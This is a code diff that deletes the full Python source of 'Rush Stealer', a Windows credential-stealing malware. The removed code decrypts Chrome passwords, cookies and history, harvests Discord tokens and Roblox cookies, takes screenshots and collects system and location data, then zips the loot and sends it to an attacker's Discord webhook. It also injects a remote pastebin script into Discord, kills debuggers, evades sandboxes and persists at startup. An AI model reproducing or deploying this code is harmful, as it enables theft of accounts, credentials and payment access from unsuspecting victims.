@@ -1,1065 +1,411 @@
-# Rush Stealer By DAKNO$Y
-# https://darknosy.github.io/
-
-import asyncio
-import ctypes
-import json
-import ntpath
+#Importing modules
 import os
-import random
-import re
-import shutil
-import sqlite3
-import subprocess
-import threading
-import winreg
-import zipfile
-from base64 import b64decode
-from datetime import datetime, timedelta, timezone
-from sys import argv
-from tempfile import gettempdir, mkdtemp
-
-import httpx
-import psutil
-from Crypto.Cipher import AES
-from PIL import ImageGrab
-from win32crypt import CryptUnprotectData
-
-__author__ = "DARKNOSY"
-__version__ = "Beta"
-__license__ = "M.I.T"
-__config__ = {
-    "webhook": "WEBHOOK_HERE",  # Place your webhook here
-    "webhook_protector_key": "KEY_HERE",
-    # keep it as it is unless you want to have a custom one
-    "injection_url": "https://pastebin.com/raw/U3B6Dnys",
-    # if True, it will ping @everyone when someone ran Rush Stealer
-    "ping_on_run": True,
-    # set to False if you don't want it to kill programs such as discord upon running the exe
-    "kill_processes": True,
-    # if you want the file to run at startup
-    "startup": True,
-    # if you want the file to hide itself after run
-    "hide_self": True,
-    # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
-    "anti_debug": True,
-    # this list of programs will be killed if rush detects that any of these are running, you can add more if you want
-    "blackListedPrograms": [
-        "httpdebuggerui",
-        "wireshark",
-        "fiddler",
-        "regedit",
-        "cmd",
-        "taskmgr",
-        "vboxservice",
-        "df5serv",
-        "processhacker",
-        "vboxtray",
-        "vmtoolsd",
-        "vmwaretray",
-        "ida64",
-        "ollydbg",
-        "pestudio",
-        "vmwareuser",
-        "vgauthservice",
-        "vmacthlp",
-        "x96dbg",
-        "vmsrvc",
-        "x32dbg",
-        "vmusrvc",
-        "prl_cc",
-        "prl_tools",
-        "xenservice",
-        "qemu-ga",
-        "joeboxcontrol",
-        "ksdumperclient",
-        "ksdumper",
-        "joeboxserver",
-    ],
-}
-# global variables
-Victim = os.getlogin()
-Victim_pc = os.getenv("COMPUTERNAME")
-ram = str(psutil.virtual_memory()[0] / 1024**3).split(".")[0]
-disk = str(psutil.disk_usage("/")[0] / 1024**3).split(".")[0]
-
-
-class Functions(object):
-    @staticmethod
-    def get_master_key(path: str or os.PathLike):
-        if not ntpath.exists(path):
-            return None
-        with open(path, "r", encoding="utf-8") as f:
-            c = f.read()
-        local_state = json.loads(c)
-
-        try:
-            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-            return Functions.win_decrypt(master_key[5:])
-        except KeyError:
-            return None
-
-    @staticmethod
-    def convert_time(time: int or float) -> str:
-        try:
-            epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
-            codestamp = epoch + timedelta(microseconds=time)
-            return codestamp
-        except Exception:
-            pass
-
-    @staticmethod
-    def win_decrypt(encrypted_str: bytes) -> str:
-        return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]
-
-    @staticmethod
-    def create_temp_file(_dir: str or os.PathLike = gettempdir()):
-        file_name = "".join(
-            random.SystemRandom().choice(
-                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-            )
-            for _ in range(random.randint(10, 20))
-        )
-        path = ntpath.join(_dir, file_name)
-        open(path, "x")
-        return path
-
-    @staticmethod
-    def decrypt_val(buff, master_key) -> str:
-        try:
-            iv = buff[3:15]
-            payload = buff[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted_pass = cipher.decrypt(payload)
-            decrypted_pass = decrypted_pass[:-16].decode()
-            return decrypted_pass
-        except Exception:
-            return f'Failed to decrypt "{str(buff)}" | key: "{str(master_key)}"'
-
-    @staticmethod
-    def get_headers(token: str = None):
-        headers = {
-            "Content-Type": "application/json",
-        }
-        if token:
-            headers.update({"Authorization": token})
-        return headers
-
-    @staticmethod
-    def system_info() -> list:
-        flag = 0x08000000
-        sh1 = "wmic csproduct get uuid"
-        sh2 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
-        sh3 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
-        try:
-            HWID = (
-                subprocess.check_output(sh1, creationflags=flag)
-                .decode()
-                .split("\n")[1]
-                .strip()
-            )
-        except Exception:
-            HWID = "N/A"
-        try:
-            wkey = subprocess.check_output(sh2, creationflags=flag).decode().rstrip()
-        except Exception:
-            wkey = "N/A"
-        try:
-            winver = subprocess.check_output(sh3, creationflags=flag).decode().rstrip()
-        except Exception:
-            winver = "N/A"
-        return [HWID, winver, wkey]
-
-    @staticmethod
-    def network_info() -> list:
-        ip, city, country, region, org, loc, googlemap = (
-            "None",
-            "None",
-            "None",
-            "None",
-            "None",
-            "None",
-            "None",
-        )
-        req = httpx.get("https://ipinfo.io/json")
-        if req.status_code == 200:
-            data = req.json()
-            ip = data.get("ip")
-            city = data.get("city")
-            country = data.get("country")
-            region = data.get("region")
-            org = data.get("org")
-            loc = data.get("loc")
-            googlemap = "https://www.google.com/maps/search/google+map++" + loc
-        return [ip, city, country, region, org, loc, googlemap]
-
-    @staticmethod
-    def fetch_conf(e: str) -> str or bool | None:
-        return __config__.get(e)
-
-
-class RushStealer(Functions):
-    def __init__(self):
-        self.webhook = self.fetch_conf("webhook")
-        self.discordApi = "https://discord.com/api/v9/users/@me"
-        self.appdata = os.getenv("localappdata")
-        self.roaming = os.getenv("appdata")
-        self.chrome_user_data = ntpath.join(
-            self.appdata, "Google", "Chrome", "User Data"
-        )
-        self.dir, self.temp = mkdtemp(), gettempdir()
-        inf, net = self.system_info(), self.network_info()
-        self.hwid, self.winver, self.winkey = inf[0], inf[1], inf[2]
-        (
-            self.ip,
-            self.city,
-            self.country,
-            self.region,
-            self.org,
-            self.loc,
-            self.googlemap,
-        ) = (net[0], net[1], net[2], net[3], net[4], net[5], net[6])
-        self.startup_loc = ntpath.join(
-            self.roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
-        )
-
-        self.hook_reg = "api/webhooks"
-        self.chrome_reg = re.compile(
-            r"(^profile\s\d*)|default|(guest profile$)", re.IGNORECASE | re.MULTILINE
-        )
-        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
-        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
-
-        self.sep = os.sep
-        self.tokens = []
-        self.robloxcookies = []
-        self.chrome_key = self.get_master_key(
-            ntpath.join(self.chrome_user_data, "Local State")
-        )
-
-        os.makedirs(self.dir, exist_ok=True)
-
-    def rush_exit(self):
-        shutil.rmtree(self.dir, ignore_errors=True)
-        os._exit(0)
-
-    def try_extract(func):
-        """Decorator to safely catch and ignore exceptions"""
-
-        def wrapper(*args, **kwargs):
-            try:
-                func(*args, **kwargs)
-            except Exception:
-                pass
-
-        return wrapper
-
-    async def checkToken(self, tkn: str) -> str:
-        try:
-            r = httpx.get(
-                url=self.discordApi, headers=self.get_headers(tkn), timeout=5.0
-            )
-        except (httpx.ConnectTimeout, httpx.TimeoutException):
-            pass
-        if r.status_code == 200 and tkn not in self.tokens:
-            self.tokens.append(tkn)
-
-    async def init(self):
-        if self.webhook == "" or self.webhook == "\x57EBHOOK_HERE":
-            self.rush_exit()
-
-        if __author__ != "\x52\x64\x69\x6d\x6f":
-            self.rush_exit()
-
-        if self.fetch_conf("anti_debug") and AntiDebug().inVM is True:
-            self.rush_exit()
-
-        await self.bypassBetterDiscord()
-        await self.bypassTokenProtector()
-
-        function_list = [
-            self.screenshot,
-            self.sys_dump,
-            self.grab_tokens,
-            self.grabMinecraftCache,
-            self.grabRobloxCookie,
-        ]
-        if self.fetch_conf("hide_self"):
-            function_list.append(self.hide)
-
-        if self.fetch_conf("kill_processes"):
-            await self.killProcesses()
-
-        if self.fetch_conf("startup"):
-            function_list.append(self.startup)
-
-        if ntpath.exists(self.chrome_user_data) and self.chrome_key is not None:
-            os.makedirs(ntpath.join(self.dir, "Google"), exist_ok=True)
-            function_list.extend(
-                [self.grabPassword, self.grabCookies, self.grabHistory]
-            )
-
-        for func in function_list:
-            process = threading.Thread(target=func, daemon=True)
-            process.start()
-        for t in threading.enumerate():
-            try:
-                t.join()
-            except RuntimeError:
-                continue
-        self.neatifyTokens()
-        await self.injector()
-        self.finish()
-
-    def hide(self):
-        ctypes.windll.kernel32.SetFileAttributesW(argv[0], 2)
-
-    def startup(self):
-        try:
-            shutil.copy2(argv[0], self.startup_loc)
-        except Exception:
-            pass
-
-    async def injector(self):
-        # TO DO: reduce cognetive complexity
-        for _dir in os.listdir(self.appdata):
-            if "discord" in _dir.lower() and ntpath.isdir(_dir):
-                discord = self.appdata + os.sep + _dir
-                for __dir in os.listdir(ntpath.abspath(discord)):
-                    if re.match(r"app-(\d*\.\d*)*", __dir):
-                        app = ntpath.abspath(ntpath.join(discord, __dir))
-                        modules = ntpath.join(app, "modules")
-                        if not ntpath.exists(modules):
-                            return
-                        for ___dir in os.listdir(modules):
-                            if re.match(r"discord_desktop_core-\d+", ___dir):
-                                inj_path = (
-                                    modules
-                                    + os.sep
-                                    + ___dir
-                                    + f"\\discord_desktop_core\\"
-                                )
-                                if ntpath.exists(inj_path):
-                                    if self.startup_loc not in argv[0]:
-                                        try:
-                                            os.makedirs(
-                                                inj_path + "initiation", exist_ok=True
-                                            )
-                                        except PermissionError:
-                                            pass
-                                    if self.hook_reg in self.webhook:
-                                        f = httpx.get(
-                                            self.fetch_conf("injection_url")
-                                        ).text.replace("%WEBHOOK%", self.webhook)
-                                    else:
-                                        f = (
-                                            httpx.get(self.fetch_conf("injection_url"))
-                                            .text.replace("%WEBHOOK%", self.webhook)
-                                            .replace(
-                                                "%WEBHOOK_KEY%",
-                                                self.fetch_conf(
-                                                    "webhook_protector_key"
-                                                ),
-                                            )
-                                        )
-                                    try:
-                                        with open(
-                                            inj_path + "index.js", "w", errors="ignore"
-                                        ) as indexFile:
-                                            indexFile.write(f)
-                                    except PermissionError:
-                                        pass
-                                    if self.fetch_conf("kill_processes"):
-                                        os.startfile(app + self.sep + _dir + ".exe")
-
-    async def killProcesses(self):
-        blackListedPrograms = self.fetch_conf("blackListedPrograms")
-        for i in [
-            "discord",
-            "discordtokenprotector",
-            "discordcanary",
-            "discorddevelopment",
-            "discordptb",
-        ]:
-            blackListedPrograms.append(i)
-        for proc in psutil.process_iter():
-            if any(procstr in proc.name().lower() for procstr in blackListedPrograms):
-                try:
-                    proc.kill()
-                except (psutil.NoSuchProcess, psutil.AccessDenied):
-                    pass
-
-    async def bypassTokenProtector(self):
-        # fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
-        tp = f"{self.roaming}\\DiscordTokenProtector\\"
-        if not ntpath.exists(tp):
-            return
-        config = tp + "config.json"
-
-        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
-            try:
-                os.remove(tp + i)
-            except FileNotFoundError:
-                pass
-        if ntpath.exists(config):
-            with open(config, errors="ignore") as f:
-                try:
-                    item = json.load(f)
-                except json.decoder.JSONDecodeError:
-                    return
-                item[
-                    "darkno$y_just_shit_on_this_token_protector"
-                ] = "https://github.com/darknosy"
-                item["auto_start"] = False
-                item["auto_start_discord"] = False
-                item["integrity"] = False
-                item["integrity_allowbetterdiscord"] = False
-                item["integrity_checkexecutable"] = False
-                item["integrity_checkhash"] = False
-                item["integrity_checkmodule"] = False
-                item["integrity_checkscripts"] = False
-                item["integrity_checkresource"] = False
-                item["integrity_redownloadhashes"] = False
-                item["iterations_iv"] = 364
-                item["iterations_key"] = 457
-                item["version"] = 69420
-            with open(config, "w") as f:
-                json.dump(item, f, indent=2, sort_keys=True)
-            with open(config, "a") as f:
-                f.write(
-                    "\n\n//darkno$y just shit on this token protector"
-                )
-
-    async def bypassBetterDiscord(self):
-        bd = self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
-        if ntpath.exists(bd):
-            x = self.hook_reg
-            with open(bd, "r", encoding="cp437", errors="ignore") as f:
-                txt = f.read()
-                content = txt.replace(x, "Darkno$yTheGoat")
-            with open(bd, "w", newline="", encoding="cp437", errors="ignore") as f:
-                f.write(content)
-
-    @try_extract
-    def grab_tokens(self):
-        paths = {
-            "Discord": self.roaming + "\\discord\\Local Storage\\leveldb\\",
-            "Discord Canary": self.roaming
-            + "\\discordcanary\\Local Storage\\leveldb\\",
-            "Lightcord": self.roaming + "\\Lightcord\\Local Storage\\leveldb\\",
-            "Discord PTB": self.roaming + "\\discordptb\\Local Storage\\leveldb\\",
-            "Opera": self.roaming
-            + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
-            "Opera GX": self.roaming
-            + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
-            "Amigo": self.appdata + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
-            "Torch": self.appdata + "\\Torch\\User Data\\Local Storage\\leveldb\\",
-            "Kometa": self.appdata + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
-            "Orbitum": self.appdata + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
-            "CentBrowser": self.appdata
-            + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
-            "7Star": self.appdata
-            + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
-            "Sputnik": self.appdata
-            + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
-            "Vivaldi": self.appdata
-            + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
-            "Chrome SxS": self.appdata
-            + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
-            "Chrome": self.chrome_user_data + "\\Default\\Local Storage\\leveldb\\",
-            "Epic Privacy Browser": self.appdata
-            + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
-            "Microsoft Edge": self.appdata
-            + "\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",
-            "Uran": self.appdata
-            + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
-            "Yandex": self.appdata
-            + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
-            "Brave": self.appdata
-            + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
-            "Iridium": self.appdata
-            + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\",
-        }
-
-        for name, path in paths.items():
-            if not ntpath.exists(path):
-                continue
-            disc = name.replace(" ", "").lower()
-            if "cord" in path:
-                if ntpath.exists(self.roaming + f"\\{disc}\\Local State"):
-                    for file_name in os.listdir(path):
-                        if file_name[-3:] not in ["log", "ldb"]:
-                            continue
-                        for line in [
-                            x.strip()
-                            for x in open(
-                                f"{path}\\{file_name}", errors="ignore"
-                            ).readlines()
-                            if x.strip()
-                        ]:
-                            for y in re.findall(self.encrypted_regex, line):
-                                token = self.decrypt_val(
-                                    b64decode(y.split("dQw4w9WgXcQ:")[1]),
-                                    self.get_master_key(
-                                        self.roaming + f"\\{disc}\\Local State"
-                                    ),
-                                )
-                                asyncio.run(self.checkToken(token))
-            else:
-                for file_name in os.listdir(path):
-                    if file_name[-3:] not in ["log", "ldb"]:
-                        continue
-                    for line in [
-                        x.strip()
-                        for x in open(
-                            f"{path}\\{file_name}", errors="ignore"
-                        ).readlines()
-                        if x.strip()
-                    ]:
-                        for token in re.findall(self.regex, line):
-                            asyncio.run(self.checkToken(token))
-
-        if ntpath.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
-            for path, _, files in os.walk(
-                self.roaming + "\\Mozilla\\Firefox\\Profiles"
-            ):
-                for _file in files:
-                    if not _file.endswith(".sqlite"):
-                        continue
-                    for line in [
-                        x.strip()
-                        for x in open(f"{path}\\{_file}", errors="ignore").readlines()
-                        if x.strip()
-                    ]:
-                        for token in re.findall(self.regex, line):
-                            asyncio.run(self.checkToken(token))
-
-    @try_extract
-    def grabPassword(self):
-        f = open(
-            ntpath.join(self.dir, "Google", "Google Passwords.txt"),
-            "w",
-            encoding="cp437",
-            errors="ignore",
-        )
-        for prof in os.listdir(self.chrome_user_data):
-            if re.match(self.chrome_reg, prof):
-                login_db = ntpath.join(self.chrome_user_data, prof, "Login Data")
-                login = self.create_temp_file()
-
-                shutil.copy2(login_db, login)
-                conn = sqlite3.connect(login)
-                cursor = conn.cursor()
-                cursor.execute(
-                    "SELECT action_url, username_value, password_value FROM logins"
-                )
-
-                for r in cursor.fetchall():
-                    url = r[0]
-                    username = r[1]
-                    encrypted_password = r[2]
-                    decrypted_password = self.decrypt_val(
-                        encrypted_password, self.chrome_key
-                    )
-                    if url != "":
-                        f.write(
-                            f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n"
-                        )
-
-                cursor.close()
-                conn.close()
-                os.remove(login)
-        f.close()
-
-    @try_extract
-    def grabCookies(self):
-        f = open(
-            ntpath.join(self.dir, "Google", "Google Cookies.txt"),
-            "w",
-            encoding="cp437",
-            errors="ignore",
-        )
-        for prof in os.listdir(self.chrome_user_data):
-            if re.match(self.chrome_reg, prof):
-                login_db = ntpath.join(
-                    self.chrome_user_data, prof, "Network", "cookies"
-                )
-                login = self.create_temp_file()
-
-                shutil.copy2(login_db, login)
-                conn = sqlite3.connect(login)
-                cursor = conn.cursor()
-                cursor.execute("SELECT host_key, name, encrypted_value from cookies")
-
-                for r in cursor.fetchall():
-                    host = r[0]
-                    user = r[1]
-                    decrypted_cookie = self.decrypt_val(r[2], self.chrome_key)
-                    if host != "":
-                        f.write(
-                            f"HOST KEY: {host} | NAME: {user} | VALUE: {decrypted_cookie}\n"
-                        )
-                    if (
-                        "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
-                        in decrypted_cookie
-                    ):
-                        self.robloxcookies.append(decrypted_cookie)
-
-                cursor.close()
-                conn.close()
-                os.remove(login)
-        f.close()
-
-    @try_extract
-    def grabHistory(self):
-        f = open(
-            ntpath.join(self.dir, "Google", "Google History.txt"),
-            "w",
-            encoding="cp437",
-            errors="ignore",
-        )
-
-        def extract_search_history(db_cursor):
-            db_cursor.execute("SELECT term FROM keyword_search_terms")
-            search_terms = ""
-            for item in db_cursor.fetchall():
-                if item[0] != "":
-                    search_terms += f"{item[0]}\n"
-            return search_terms
-
-        def extract_web_history(db_cursor):
-            web = ""
-            db_cursor.execute("SELECT title, url, last_visit_time FROM urls")
-            for item in db_cursor.fetchall():
-                web += f"Title: {item[0]}\nUrl: {item[1]}\nLast Time Visit: {self.convert_time(item[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"
-            return web
-
-        for prof in os.listdir(self.chrome_user_data):
-            if re.match(self.chrome_reg, prof):
-                login_db = ntpath.join(self.chrome_user_data, prof, "History")
-                login = self.create_temp_file()
-
-                shutil.copy2(login_db, login)
-                conn = sqlite3.connect(login)
-                cursor = conn.cursor()
-
-                search_history = extract_search_history(cursor)
-                web_history = extract_web_history(cursor)
-
-                f.write(
-                    f"{' '*17}Search History\n{'-'*50}\n{search_history}\n{' '*17}\n\nWeb History\n{'-'*50}\n{web_history}"
-                )
-
-                cursor.close()
-                conn.close()
-                os.remove(login)
-        f.close()
-
-    def neatifyTokens(self):
-        f = open(
-            self.dir + "\\Discord Info.txt", "w", encoding="cp437", errors="ignore"
-        )
-        for token in self.tokens:
-            j = httpx.get(self.discordApi, headers=self.get_headers(token)).json()
-            user = j.get("username") + "#" + str(j.get("discriminator"))
-
-            badges = ""
-            flags = j["flags"]
-            if flags == 1:
-                badges += "Staff, "
-            if flags == 2:
-                badges += "Partner, "
-            if flags == 4:
-                badges += "Hypesquad Event, "
-            if flags == 8:
-                badges += "Green Bughunter, "
-            if flags == 64:
-                badges += "Hypesquad Bravery, "
-            if flags == 128:
-                badges += "HypeSquad Brillance, "
-            if flags == 256:
-                badges += "HypeSquad Balance, "
-            if flags == 512:
-                badges += "Early Supporter, "
-            if flags == 16384:
-                badges += "Gold BugHunter, "
-            if flags == 131072:
-                badges += "Verified Bot Developer, "
-            if badges == "":
-                badges = "None"
-
-            email = j.get("email")
-            phone = j.get("phone") if j.get("phone") else "No Phone Number attached"
-            nitro_data = httpx.get(
-                self.discordApi + "/billing/subscriptions",
-                headers=self.get_headers(token),
-            ).json()
-            has_nitro = False
-            has_nitro = bool(len(nitro_data) > 0)
-            billing = bool(
-                len(
-                    json.loads(
-                        httpx.get(
-                            self.discordApi + "/billing/payment-sources",
-                            headers=self.get_headers(token),
-                        ).text
-                    )
-                )
-                > 0
-            )
-            f.write(
-                f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n"
-            )
-        f.close()
-
-    def grabMinecraftCache(self):
-        minecraft = ntpath.join(self.dir, "Minecraft")
-        os.makedirs(minecraft, exist_ok=True)
-        mc = ntpath.join(self.roaming, ".minecraft")
-        to_grab = [
-            "launcher_accounts.json",
-            "launcher_profiles.json",
-            "usercache.json",
-            "launcher_log.txt",
-        ]
-
-        for _file in to_grab:
-            if ntpath.exists(ntpath.join(mc, _file)):
-                shutil.copy2(ntpath.join(mc, _file), minecraft + self.sep + _file)
-
-    def grabRobloxCookie(self):
-        def subproc(path):
-            try:
-                return (
-                    subprocess.check_output(
-                        rf"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
-                        creationflags=0x08000000,
-                    )
-                    .decode()
-                    .rstrip()
-                )
-            except Exception:
-                return None
-
-        reg_cookie = subproc(r"HKLM")
-        if not reg_cookie:
-            reg_cookie = subproc(r"HKCU")
-        if reg_cookie:
-            self.robloxcookies.append(reg_cookie)
-        if self.robloxcookies:
-            with open(self.dir + "\\Roblox Cookies.txt", "w") as f:
-                for i in self.robloxcookies:
-                    f.write(i + "\n")
-
-    def screenshot(self):
-        image = ImageGrab.grab(
-            bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None
-        )
-        image.save(self.dir + "\\Screenshot.png")
-        image.close()
-
-    def sys_dump(self):
-        line_sep = "=" * 50
-        about = f"""
-{line_sep}
-{Victim} | {Victim_pc}
-{line_sep}
-Windows key: {self.winkey}
-Windows version: {self.winver}
-{line_sep}
-RAM: {ram}GB
-DISK: {disk}GB
-HWID: {self.hwid}
-{line_sep}
-IP: {self.ip}
-City: {self.city}
-Country: {self.country}
-Region: {self.region}
-Org: {self.org}
-GoogleMaps: {self.googlemap}
-{line_sep}
-        """
-        with open(
-            self.dir + "\\System info.txt", "w", encoding="utf-8", errors="ignore"
-        ) as f:
-            f.write(about)
-
-    def finish(self):
-        for i in os.listdir(self.dir):
-            if i.endswith(".txt"):
-                path = self.dir + self.sep + i
-                with open(path, "r", errors="ignore") as ff:
-                    x = ff.read()
-                    if not x:
-                        ff.close()
-                        os.remove(path)
-                    else:
-                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
-                            f.write(
-                                "・Rush Stealer By DARKNO$\n\n"
-                            )
-                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
-                            fp.write(
-                                x
-                                + "\n\n・Rush Stealer By DARKNO$Y"
-                            )
-
-        _zipfile = ntpath.join(self.appdata, f"Rush-Stealer-[{Victim}].zip")
-        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
-        abs_src = ntpath.abspath(self.dir)
-        for dirname, _, files in os.walk(self.dir):
-            for filename in files:
-                absname = ntpath.abspath(ntpath.join(dirname, filename))
-                arcname = absname[len(abs_src) + 1 :]
-                zipped_file.write(absname, arcname)
-        zipped_file.close()
-
-        file_count, files_found, tokens = 0, "", ""
-        for _, __, files in os.walk(self.dir):
-            for _file in files:
-                files_found += f"・{_file}\n"
-                file_count += 1
-        for tkn in self.tokens:
-            tokens += f"{tkn}\n\n"
-        fileCount = f"{file_count} Files Found: "
-
-        embed = {
-            "avatar_url": "https://cdn.discordapp.com/attachments/559513113645547521/1103871603282018414/Discord_Pfp_Red_Devil.gif",
-            "embeds": [
-                {
-                    "author": {
-                        "name": f"*{Victim}* Just fell victim to Rush Stealer, what a loser",
-                        "url": "https://darknosy.github.io/",
-                        "icon_url": "https://cdn.discordapp.com/attachments/559513113645547521/1103871603282018414/Discord_Pfp_Red_Devil.gif",
-                    },
-                    "color": FF0000,
-                    "description": f"[Google Maps Location]({self.googlemap})",
-                    "fields": [
-                        {
-                            "name": "\u200b",
-                            "value": f"""```fix
-                                IP:᠎ {self.ip.replace(" ", "᠎ ") if self.ip else "N/A"}
-                                Org:᠎ {self.org.replace(" ", "᠎ ") if self.org else "N/A"}
-                                City:᠎ {self.city.replace(" ", "᠎ ") if self.city else "N/A"}
-                                Region:᠎ {self.region.replace(" ", "᠎ ") if self.region else "N/A"}
-                                Country:᠎ {self.country.replace(" ", "᠎ ") if self.country else "N/A"}```
-                            """.replace(
-                                " ", ""
-                            ),
-                            "inline": True,
-                        },
-                        {
-                            "name": "\u200b",
-                            "value": f"""```fix
-                                PCName: {Victim_pc.replace(" ", "᠎ ")}
-                                WinKey:᠎ {self.winkey.replace(" ", "᠎ ")}
-                                WinVer:᠎ {self.winver.replace(" ", "᠎ ")}
-                                DiskSpace:᠎ {disk}GB
-                                Ram:᠎ {ram}GB```
-                            """.replace(
-                                " ", ""
-                            ),
-                            "inline": True,
-                        },
-                        {
-                            "name": "**Tokens:**",
-                            "value": f"""```yaml
-                                {tokens if tokens else "No tokens extracted"}```
-                            """.replace(
-                                " ", ""
-                            ),
-                            "inline": False,
-                        },
-                        {
-                            "name": fileCount,
-                            "value": f"""```ini
-                                [
-                                {files_found.strip()}
-                                ]```
-                            """.replace(
-                                " ", ""
-                            ),
-                            "inline": False,
-                        },
-                    ],
-                    "footer": {
-                        "text": "Rush Stealer By DARKNO$Y"
-                    },
-                }
-            ],
-        }
-        if self.fetch_conf("ping_on_run"):
-            embed.update({"content": "@everyone"})
-
-        with open(_zipfile, "rb") as f:
-            if self.hook_reg in self.webhook:
-                httpx.post(self.webhook, json=embed)
-                httpx.post(self.webhook, files={"upload_file": f})
-            else:
-                from pyotp import TOTP
-
-                key = TOTP(self.fetch_conf("webhook_protector_key")).now()
-                httpx.post(self.webhook, headers={"Authorization": key}, json=embed)
-                httpx.post(
-                    self.webhook,
-                    headers={"Authorization": key},
-                    files={"upload_file": f},
-                )
-        os.remove(_zipfile)
-        self.rush_exit()
-
-
-class AntiDebug(Functions):
-    inVM = False
-
-    def __init__(self):
-        self.processes = list()
-
-        self.blackListedUsers = [
-            "WDAGUtilityAccount",
-            "Abby",
-            "Peter Wilson",
-            "hmarc",
-            "patex",
-            "JOHN-PC",
-            "RDhJ0CNFevzX",
-            "kEecfMwgj",
-            "Frank",
-            "8Nl0ColNQ5bq",
-            "Lisa",
-            "John",
-            "george",
-            "PxmdUOpVyx",
-            "8VizSM",
-            "w0fjuOVmCcP5A",
-            "lmVwjj9b",
-            "PqONjHVwexsS",
-            "3u2v9m8",
-            "Julia",
-            "HEUeRzl",
-        ]
-        self.blackListedPCNames = [
-            "BEE7370C-8C0C-4",
-            "DESKTOP-NAKFFMT",
-            "WIN-5E07COS9ALR",
-            "B30F0242-1C6A-4",
-            "DESKTOP-VRSQLAG",
-            "Q9IATRKPRH",
-            "XC64ZB",
-            "DESKTOP-D019GDM",
-            "DESKTOP-WI8CLET",
-            "SERVER1",
-            "LISA-PC",
-            "JOHN-PC",
-            "DESKTOP-B0T93D6",
-            "DESKTOP-1PYKP29",
-            "DESKTOP-1Y2433R",
-            "WILEYPC",
-            "WORK",
-            "6C4E733F-C2D9-4",
-            "RALPHS-PC",
-            "DESKTOP-WG3MYJS",
-            "DESKTOP-7XC6GEZ",
-            "DESKTOP-5OV9S0O",
-            "QarZhrdBpj",
-            "ORELEEPC",
-            "ARCHIBALDPC",
-            "JULIA-PC",
-            "d1bnJkfVlH",
-        ]
-        self.blackListedHWIDS = [
-            "7AB5C494-39F5-4941-9163-47F54D6D5016",
-            "032E02B4-0499-05C3-0806-3C0700080009",
-            "03DE0294-0480-05DE-1A06-350700080009",
-            "11111111-2222-3333-4444-555555555555",
-            "6F3CA5EC-BEC9-4A4D-8274-11168F640058",
-            "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
-            "4C4C4544-0050-3710-8058-CAC04F59344A",
-            "00000000-0000-0000-0000-AC1F6BD04972",
-            "79AF5279-16CF-4094-9758-F88A616D81B4",
-            "5BD24D56-789F-8468-7CDC-CAA7222CC121",
-            "49434D53-0200-9065-2500-65902500E439",
-            "49434D53-0200-9036-2500-36902500F022",
-            "777D84B3-88D1-451C-93E4-D235177420A7",
-            "49434D53-0200-9036-2500-369025000C65",
-            "B1112042-52E8-E25B-3655-6A4F54155DBF",
-            "00000000-0000-0000-0000-AC1F6BD048FE",
-            "EB16924B-FB6D-4FA1-8666-17B91F62FB37",
-            "A15A930C-8251-9645-AF63-E45AD728C20C",
-            "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3",
-            "C7D23342-A5D4-68A1-59AC-CF40F735B363",
-            "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
-            "44B94D56-65AB-DC02-86A0-98143A7423BF",
-            "6608003F-ECE4-494E-B07E-1C4615D1D93C",
-            "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
-            "49434D53-0200-9036-2500-369025003AF0",
-            "8B4E8278-525C-7343-B825-280AEBCD3BCB",
-            "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
-        ]
-
-        for func in [self.listCheck, self.registryCheck, self.specsCheck]:
-            process = threading.Thread(target=func, daemon=True)
-            self.processes.append(process)
-            process.start()
